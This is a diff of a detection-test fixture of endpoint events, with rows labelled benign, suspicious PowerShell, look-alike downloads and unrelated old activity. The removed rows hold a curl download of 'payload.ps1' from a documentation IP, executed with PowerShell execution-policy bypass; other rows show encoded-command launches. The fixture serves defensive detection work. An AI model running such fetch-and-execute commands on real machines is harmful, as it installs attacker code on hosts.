@@ -1,9 +1,14 @@
-Time|DeviceName|AccountName|ProcessName|CommandLine|ParentProcess|RemoteIP|Case
-10:00:01|win-01|alice|chrome.exe|chrome.exe|explorer.exe|-|BENIGN
-10:05:10|win-02|bob|powershell.exe|powershell.exe -NoProfile Get-Process|explorer.exe|-|BENIGN_ADMIN
-10:10:00|win-03|user1|powershell.exe|powershell.exe -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA|cmd.exe|203.0.113.50|SUSPICIOUS_PS
-10:10:08|win-03|user1|curl.exe|curl.exe http://203.0.113.50/payload.ps1 -o C:\Users\Public\update.ps1|powershell.exe|203.0.113.50|SUSPICIOUS_PS
-10:10:20|win-03|user1|powershell.exe|powershell.exe -ExecutionPolicy Bypass C:\Users\Public\update.ps1|cmd.exe|203.0.113.50|SUSPICIOUS_PS
-10:20:00|win-04|svc_backup|powershell.exe|powershell.exe -File C:\Scripts\backup.ps1|taskeng.exe|-|BENIGN_BACKUP
-08:00:00|win-05|user2|powershell.exe|powershell.exe -ExecutionPolicy Bypass -EncodedCommand TEST|cmd.exe|198.51.100.10|OLD_UNRELATED
-11:30:00|win-05|user2|curl.exe|curl.exe http://198.51.100.10/payload.ps1 -o C:\Users\Public\old.ps1|powershell.exe|198.51.100.10|OLD_UNRELATED
+event_time|case_id|event_type|host|user|source_ip|destination_ip|process_name|parent_process_name|command_line|url|domain|action|result|auth_method|rule_context
+2026-06-24T10:00:01|BENIGN|process_start|win-01|alice|-|-|chrome.exe|explorer.exe|chrome.exe|-|-|execute|success|-|interactive_user
+2026-06-24T10:05:10|BENIGN_ADMIN|process_start|win-02|bob|-|-|powershell.exe|explorer.exe|powershell.exe -NoProfile Get-Process|-|-|execute|success|-|signed_admin_script
+2026-06-24T10:10:00|SUSPICIOUS_PS|process_start|win-03|user1|-|-|powershell.exe|cmd.exe|powershell.exe -EncodedCommand <redacted>|-|-|execute|success|-|encoded_command
+2026-06-24T10:10:08|SUSPICIOUS_PS|network_connection|win-03|user1|10.10.2.3|203.0.113.50|curl.exe|powershell.exe|-|https://files.example.test/content/agent.dat|files.example.test|download|success|-|untrusted_remote_content
+2026-06-24T10:10:20|SUSPICIOUS_PS|process_start|win-03|user1|-|-|powershell.exe|cmd.exe|powershell.exe -ExecutionPolicy Bypass -File C:\\ProgramData\\stage.ps1|-|-|execute|success|-|policy_bypass
+2026-06-24T10:20:00|BENIGN_BACKUP|process_start|win-04|svc_backup|-|-|powershell.exe|taskeng.exe|powershell.exe -File C:\\Scripts\\backup.ps1|-|-|execute|success|-|signed_admin_script
+2026-06-24T10:20:10|BENIGN_SIMILAR_DOWNLOAD|process_start|win-06|admin|-|-|powershell.exe|taskeng.exe|powershell.exe -File C:\\Scripts\\inventory.ps1|-|-|execute|success|-|signed_admin_script
+2026-06-24T10:20:20|BENIGN_SIMILAR_DOWNLOAD|network_connection|win-06|admin|10.10.2.6|192.0.2.60|curl.exe|powershell.exe|-|https://repo.example.test/tools/inventory.json|repo.example.test|download|success|-|approved_repository
+2026-06-24T10:30:00|KEYWORD_ONLY_COMMAND|process_start|win-07|analyst|-|-|notepad.exe|explorer.exe|notes: EncodedCommand payload.ps1|-|-|view|success|-|documentation
+2026-06-24T10:30:10|KEYWORD_ONLY_COMMAND|network_connection|win-07|analyst|10.10.2.7|192.0.2.70|browser.exe|explorer.exe|-|https://docs.example.test/payload.ps1|docs.example.test|browse|success|-|documentation
+2026-06-24T08:00:00|OLD_UNRELATED|process_start|win-05|user2|-|-|powershell.exe|cmd.exe|powershell.exe -EncodedCommand <redacted>|-|-|execute|success|-|encoded_command
+2026-06-24T08:00:10|OLD_UNRELATED|process_start|win-05|user2|-|-|powershell.exe|cmd.exe|powershell.exe -ExecutionPolicy Bypass|-|-|execute|success|-|policy_bypass
+2026-06-24T11:30:00|OLD_UNRELATED|network_connection|win-05|user2|10.10.2.5|198.51.100.10|curl.exe|powershell.exe|-|https://old.example.test/content/archive.bin|old.example.test|download|success|-|untrusted_remote_content
